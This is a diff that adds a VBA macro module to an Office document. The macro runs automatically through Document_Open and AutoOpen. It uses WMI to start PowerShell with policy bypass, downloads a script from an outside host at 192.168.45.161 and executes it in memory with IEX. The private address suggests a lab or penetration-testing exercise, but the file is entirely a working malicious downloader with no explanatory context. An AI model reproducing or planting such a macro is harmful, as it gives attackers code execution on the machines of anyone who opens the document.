@@ -1,0 +1,16 @@
+Rem Attribute VBA_ModuleType=VBAModule
+Option VBASupport 1
+Sub MyMacro()
+
+strArg = "powershell -exec bypass -nop -c IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.45.161/test.txt'))"
+
+GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
